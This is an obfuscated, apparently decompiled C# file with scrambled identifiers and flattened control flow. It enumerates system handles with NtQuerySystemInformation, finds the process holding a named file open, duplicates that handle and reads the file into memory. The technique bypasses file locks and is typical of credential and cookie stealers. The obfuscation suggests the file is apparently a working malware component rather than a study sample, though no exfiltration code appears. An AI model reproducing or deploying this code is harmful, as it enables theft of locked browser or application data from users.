using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace e1MhKBne;

public class HaAVOPYT
{
	public static byte[] _3ggy(string _0ddhTun)
	{
		int num = 0;
		vVAB vVAB2 = default;
		while (true)
		{
			if (num == 3)
			{
				return null;
			}
			if (num != 4)
			{
				if (num == 1)
				{
					vVAB2 = tJJXvHfpS(_0ddhTun);
					num = 2;
				}
				if (num == 2)
				{
					if (vVAB2.ProcessID != 0)
					{
						goto IL_003b;
					}
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					break;
				}
				continue;
			}
			goto IL_003b;
			IL_003b:
			IntPtr hSourceProcessHandle = p1BDi.OpenProcess(EKbJ.DuplicateHandle, bInheritHandle: true, (uint)vVAB2.ProcessID);
			IntPtr currentProcess = p1BDi.GetCurrentProcess();
			IntPtr lpTargetHandle = default;
			if (!p1BDi.DuplicateHandle(hSourceProcessHandle, new IntPtr(vVAB2.FileHandleID), currentProcess, out lpTargetHandle, 0u, bInheritHandle: false, _5nh.DUPLICATE_SAME_ACCESS))
			{
				break;
			}
			long lpFileSize = 0L;
			p1BDi.GetFileSizeEx(lpTargetHandle, out lpFileSize);
			IntPtr hFileMappingObject = p1BDi.CreateFileMapping(lpTargetHandle, IntPtr.Zero, UR6wXWMpkf.PageReadonly, 0u, 0u, null);
			IntPtr source = p1BDi.MapViewOfFile(hFileMappingObject, ntijC.FileMapRead, 0u, 0u, 0u);
			byte[] array = new byte[lpFileSize];
			Marshal.Copy(source, array, 0, (int)lpFileSize);
			return array;
		}
		return null;
	}

	public static vVAB tJJXvHfpS(string qNu3eoZcngF, string[] lUK = null)
	{
		int num = 0;
		List<Process> list = default;
		List<Process>.Enumerator enumerator = default;
		int num2 = default;
		int num3 = default;
		Process process = default;
		Process[] processes = default;
		string[] array = default;
		string processName = default;
		do
		{
			if (num == 2)
			{
				list = new List<Process>();
				num = 3;
			}
			if (num == 10)
			{
				goto IL_0042;
			}
			goto IL_0059;
			IL_018a:
			enumerator = list.GetEnumerator();
			num = 21;
			goto IL_01a0;
			IL_03c7:
			if (num == 7)
			{
				goto IL_03d8;
			}
			goto IL_03ee;
			IL_0059:
			if (num == 18)
			{
				num2++;
				num = 19;
			}
			if (num == 5)
			{
				num3 = 0;
				num = 6;
			}
			if (num == 8)
			{
				if (process.HandleCount == 0)
				{
					goto IL_0042;
				}
				num = 9;
			}
			if (num == 3)
			{
				if (lUK != null)
				{
					goto IL_0100;
				}
				num = 4;
			}
			if (num == 13)
			{
				goto IL_0100;
			}
			goto IL_0111;
			IL_0111:
			if (num == 1)
			{
				new Dictionary<int, string>();
				num = 2;
			}
			if (num == 6 || num == 11)
			{
				if (num3 < processes.Length)
				{
					goto IL_03d8;
				}
				num = 12;
			}
			if (num == 20)
			{
				goto IL_018a;
			}
			goto IL_01a0;
			IL_0100:
			array = lUK;
			num = 14;
			goto IL_0111;
			IL_0381:
			if (num == 15)
			{
				goto IL_0369;
			}
			if (num == 16)
			{
				goto IL_03b1;
			}
			goto IL_03c7;
			IL_03b1:
			processName = array[num2];
			num = 17;
			goto IL_03c7;
			IL_0369:
			if (num2 >= array.Length)
			{
				num = 20;
				goto IL_0381;
			}
			goto IL_03b1;
			IL_03ee:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_0042:
			num3++;
			num = 11;
			goto IL_0059;
			IL_03d8:
			process = processes[num3];
			num = 8;
			goto IL_03ee;
			IL_01a0:
			switch (num)
			{
			case 21:
				try
				{
					while (enumerator.MoveNext())
					{
						Process current = enumerator.Current;
						Dictionary<int, string> dictionary = _3MEoofks(current.Id);
						foreach (KeyValuePair<int, string> item in dictionary)
						{
							if (item.Value.EndsWith(qNu3eoZcngF, StringComparison.CurrentCultureIgnoreCase))
							{
								return new vVAB(current.ProcessName, current.Id, item.Value, item.Key);
							}
						}
					}
				}
				finally
				{
					((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
				}
				return default;
			case 14:
				num2 = 0;
				num = 15;
				break;
			}
			if (num == 9)
			{
				list.Add(process);
				num = 10;
			}
			if (num == 12)
			{
				goto IL_018a;
			}
			if (num == 4)
			{
				processes = Process.GetProcesses();
				num = 5;
			}
			if (num == 17)
			{
				list.AddRange(Process.GetProcessesByName(processName));
				num = 18;
			}
			if (num == 19)
			{
				goto IL_0369;
			}
			goto IL_0381;
		}
		while (num != 22);
		vVAB result = default;
		return result;
	}

	public static Dictionary<string, string> PA5mCdIFO8()
	{
		int num = 0;
		string text = default;
		Dictionary<string, string> dictionary = default;
		int num2 = default;
		string[] array = default;
		string text2 = default;
		string[] logicalDrives = default;
		StringBuilder stringBuilder = default;
		string text3 = default;
		while (true)
		{
			if (num == 1)
			{
				text = "\\Device\\LanmanRedirector\\";
				num = 2;
			}
			if (num == 14)
			{
				dictionary.Add(text.Substring(0, text.Length - 1), "\\");
				num = 15;
			}
			if (num == 6)
			{
				num2 = 0;
				num = 7;
			}
			if (num == 13)
			{
				goto IL_00aa;
			}
			goto IL_00c2;
			IL_00aa:
			if (num2 >= array.Length)
			{
				num = 14;
				goto IL_00c2;
			}
			goto IL_0124;
			IL_0124:
			text2 = array[num2];
			num = 9;
			goto IL_013a;
			IL_013a:
			if (num == 2)
			{
				logicalDrives = Environment.GetLogicalDrives();
				num = 3;
			}
			if (num == 11)
			{
				dictionary.Add(qiu(stringBuilder.ToString()), text3);
				num = 12;
			}
			if (num == 9)
			{
				text3 = text2.Substring(0, 2);
				num = 10;
			}
			if (num == 10)
			{
				p1BDi.QueryDosDevice(text3, stringBuilder, 260u);
				num = 11;
			}
			if (num == 5)
			{
				array = logicalDrives;
				num = 6;
			}
			if (num == 12)
			{
				num2++;
				num = 13;
			}
			if (num == 7)
			{
				goto IL_00aa;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 15)
			{
				break;
			}
			continue;
			IL_00c2:
			if (num == 3)
			{
				dictionary = new Dictionary<string, string>(logicalDrives.Length);
				num = 4;
			}
			if (num == 4)
			{
				stringBuilder = new StringBuilder(260);
				num = 5;
			}
			if (num == 8)
			{
				goto IL_0124;
			}
			goto IL_013a;
		}
		return dictionary;
	}

	public static string qiu(string elk0)
	{
		int num = 0;
		string text = default;
		string text2 = default;
		do
		{
			if (num == 2)
			{
				if (string.Compare(elk0, 0, text, 0, text.Length, StringComparison.InvariantCulture) != 0)
				{
					break;
				}
				num = 3;
			}
			if (num == 3)
			{
				text2 = elk0.Substring(elk0.IndexOf('\\', text.Length) + 1);
				num = 4;
			}
			switch (num)
			{
			case 4:
				return text + text2;
			case 1:
				text = "\\Device\\LanmanRedirector\\";
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		return elk0;
	}

	public static Dictionary<int, string> v69zI1GG(Dictionary<int, string> shzN51ft)
	{
		int num = 0;
		Dictionary<int, string>.Enumerator enumerator = default;
		Dictionary<int, string> dictionary = default;
		do
		{
			if (num == 2)
			{
				enumerator = shzN51ft.GetEnumerator();
				num = 3;
			}
			if (num == 1)
			{
				dictionary = new Dictionary<int, string>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			while (enumerator.MoveNext())
			{
				KeyValuePair<int, string> current = enumerator.Current;
				Dictionary<string, string> dictionary2 = PA5mCdIFO8();
				int num2 = current.Value.Length;
				while (num2 > 0 && (num2 = current.Value.LastIndexOf('\\', num2 - 1)) != -1)
				{
					if (dictionary2.TryGetValue(current.Value.Substring(0, num2), out var value))
					{
						dictionary.Add(current.Key, value + current.Value.Substring(num2));
					}
				}
			}
			return dictionary;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}

	public static Dictionary<int, string> _3MEoofks(int _2WlaAdjETBG)
	{
		int num = 0;
		IntPtr intPtr = default;
		int num2 = default;
		Dictionary<int, string> dictionary = default;
		do
		{
			if (num == 3)
			{
				intPtr = IntPtr.Zero;
				num = 4;
			}
			if (num == 2)
			{
				num2 = 65536;
				num = 3;
			}
			if (num == 1)
			{
				dictionary = new Dictionary<int, string>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			while (true)
			{
				intPtr = Marshal.AllocHGlobal(num2);
				int ReturnLength;
				switch (FMfonnOIC.NtQuerySystemInformation(DPeTMrxslx.SystemHandleInformation, intPtr, num2, out ReturnLength))
				{
				case SoEk2Z.STATUS_INFO_LENGTH_MISMATCH:
					break;
				default:
					throw new Exception("Failed to retrieve system handle information.");
				case SoEk2Z.STATUS_SUCCESS:
				{
					long num3 = intPtr.ToInt64();
					num3 += IntPtr.Size;
					int num4 = Marshal.SizeOf(typeof(xEFeCwa8));
					int num5 = (int)((IntPtr.Size == 4) ? Marshal.ReadInt32(intPtr) : Marshal.ReadInt64(intPtr));
					IntPtr intPtr2 = p1BDi.OpenProcess(EKbJ.DuplicateHandle, bInheritHandle: true, (uint)_2WlaAdjETBG);
					IntPtr currentProcess = p1BDi.GetCurrentProcess();
					for (int i = 0; i < num5; i++)
					{
						if (Marshal.ReadInt32((IntPtr)num3) == _2WlaAdjETBG)
						{
							xEFeCwa8 xEFeCwa9 = (xEFeCwa8)Marshal.PtrToStructure(new IntPtr(num3), typeof(xEFeCwa8));
							int ReturnLength2 = 0;
							IntPtr lpTargetHandle = default;
							bool flag = p1BDi.DuplicateHandle(intPtr2, new IntPtr(xEFeCwa9.HandleValue), currentProcess, out lpTargetHandle, 0u, bInheritHandle: false, _5nh.DUPLICATE_SAME_ACCESS);
							if (p1BDi.GetFileType(lpTargetHandle) == _2xMWq.Disk && flag)
							{
								int num6 = 512;
								IntPtr intPtr3 = Marshal.AllocHGlobal(num6);
								if (FMfonnOIC.NtQueryObject(lpTargetHandle, TiOT49te.ObjectNameInformation, intPtr3, num6, out ReturnLength2) == SoEk2Z.STATUS_SUCCESS)
								{
									B4Bs0Aizb b4Bs0Aizb = (B4Bs0Aizb)Marshal.PtrToStructure(intPtr3, typeof(B4Bs0Aizb));
									if (!string.IsNullOrEmpty(b4Bs0Aizb.Name.ToString()) && !string.IsNullOrEmpty(b4Bs0Aizb.Name.ToString().Trim()))
									{
										dictionary.Add(xEFeCwa9.HandleValue, b4Bs0Aizb.Name.ToString().Trim());
									}
								}
								Marshal.FreeHGlobal(intPtr3);
							}
							p1BDi.CloseHandle(lpTargetHandle);
						}
						num3 += num4;
					}
					p1BDi.CloseHandle(intPtr2);
					goto end_IL_00ad;
				}
				}
				num2 = Math.Max(num2, ReturnLength);
				Marshal.FreeHGlobal(intPtr);
				intPtr = IntPtr.Zero;
				continue;
				end_IL_00ad:
				break;
			}
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return v69zI1GG(dictionary);
	}
}
